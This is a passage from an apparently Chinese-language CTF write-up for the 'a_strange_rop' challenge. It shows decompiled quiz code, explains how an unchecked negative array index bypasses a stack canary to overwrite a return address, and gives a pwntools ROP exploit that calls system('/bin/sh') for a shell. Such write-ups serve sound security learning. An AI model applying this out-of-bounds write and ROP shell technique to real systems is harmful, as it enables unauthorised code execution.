class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  undefined8 uVar4;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">int</span> local_78;<br>  uint local_74;<br>  <span class="hljs-type">long</span> local_68 [<span class="hljs-number">11</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  id = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0040202b);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  <span class="hljs-keyword">for</span> (local_78 = <span class="hljs-number">0</span>; local_78 &lt; <span class="hljs-number">10</span>; local_78 = local_78 + <span class="hljs-number">1</span>) &#123;<br>    iVar1 = FUN_00401160();<br>    iVar2 = FUN_00401160();<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402041,(ulong)id,(ulong)(uint)(iVar1 % <span class="hljs-number">0x14</span>),(ulong)(uint)(iVar2 % <span class="hljs-number">0x14</span>));<br>    (&amp;answer)[(<span class="hljs-type">int</span>)id] = (<span class="hljs-type">long</span>)(iVar2 % <span class="hljs-number">0x14</span> + iVar1 % <span class="hljs-number">0x14</span>);<br>    id = id + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00402058);<br>  <span class="hljs-keyword">for</span> (; t &lt; <span class="hljs-number">0xb</span>; t = t + <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00402077);<br>    __isoc99_scanf(&amp;DAT_00402085,&amp;id);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)id) &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;DAT_00402088);<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x1bf52</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_004020a8);<br>    __isoc99_scanf(&amp;DAT_004020b0,local_68 + (<span class="hljs-type">int</span>)id);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_004020b8);<br>  local_74 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">9</span> &lt; (<span class="hljs-type">int</span>)local_74) &#123;<br>      uVar4 = <span class="hljs-number">1</span>;<br>LAB_00401548:<br>      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>        __stack_chk_fail();<br>      &#125;<br>      <span class="hljs-keyword">return</span> uVar4;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((&amp;answer)[(<span class="hljs-type">int</span>)local_74] != local_68[(<span class="hljs-type">int</span>)local_74]) &#123;<br>      <span class="hljs-built_in">printf</span>(&amp;DAT_004020d8,(ulong)local_74);<br>      uVar4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">goto</span> LAB_00401548;<br>    &#125;<br>    local_74 = local_74 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>运行起来是这么个样子</p><p><img src="/images/1.png" alt="交互"></p><p>略微有点长，但是并不难理解，local_10为随机生成的canary值，因此不能直接溢出覆盖返回地址，否则会触发canary检测程序直接退出</p><p>题目要求回答一些小学数学题目，全部回答正确就跳转到win函数，但是我们已经看到win函数并没有实际作用，因此思路依旧是覆盖返回地址为我们构造的rop链</p><p>先来分析一下栈布局</p><p>定义了一个数组local_68[11]</p><p>可以分析得出</p><p><img src="/images/2.png" alt="栈布局大致如此"></p><p>题目设置了一个小check机制，明明有0到9十道题目，但是数组设置了0到10十一个题目编号，而输入的题目编号大于9的时候程序自动退出，并大声斥责我们<em>你想干什么!</em></p><p>我的第一个思路是设置题目编号为8，即local_68[9]所在的位置，向上填充至覆盖rip，执行rop链</p><p>但是这个canary是我永远越不过的坎…</p><p>思来想去，我突然注意到，题目编号大于9时会自动退出，<strong>但是</strong>题目却不检查负数编号!</p><p>因此我们可以将题目设置为负数通过负索引去写前面的地址!</p><p>用gdb看一看怎么个事儿</p><p>我在第一次输入后打上了断点，输入编号<code>-1</code>并输入答案<code>666</code>，local_68在rbp下0x60的位置，我们看看更下面的情况</p><p><img src="/images/3.png" alt="地址情况"></p><p>可以看到，正如我们分析的那般，<code>-1</code>索引写的<code>666</code>代表的<code>00029a</code>写在了local_68下方的地址，再认真一看，前方的<code>0x004014bc</code>不正是另一个函数的返回地址吗!</p><p>我们只需要将索引设置为-3便可以覆盖另一个函数的返回地址来执行我们的rop链</p><p>这个函数用canary将我们拦住，十分安全，可是，另一个函数却已经悄然被我们所攻克…</p><p>题目也是十分贴心，<code>/bin/sh</code>字符串都帮我们准备好了</p><p>接下来便很简单了</p><p>exp也是十分优雅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>bin_sh = <span class="hljs-built_in">str</span>(<span class="hljs-number">4210808</span>)   <span class="hljs-comment"># 0x404078</span><br>call_system = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199136</span>)   <span class="hljs-comment"># 0x4012e0</span><br>pop_rdi_ret = <span class="hljs-built_in">str</span>(<span class="hljs-number">4199153</span>)  <span class="hljs-comment"># 0x4012f1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_pair</span>(<span class="hljs-params">idx, val</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;题目编号:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>\n&quot;</span>.encode())<br>    p.recvuntil(<span class="hljs-string">&#x27;结果:&#x27;</span>)<br>    p.send(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;val&#125;</span>\n&quot;</span>.encode())<br><br>send_pair(-<span class="hljs-number">2</span>, bin_sh)    <span class="hljs-comment"># 写 /bin/sh</span><br>send_pair(-<span class="hljs-number">1</span>, call_system)   <span class="hljs-comment"># 调用 system</span><br>send_pair(-<span class="hljs-number">3</span>, pop_rdi_ret)  <span class="hljs-comment"># 覆盖另一个函数的rip</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>最后也是成功地拿到shell</p><p>至此，终于理解题目为什么叫:<code>a_strange_rop</code>!</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
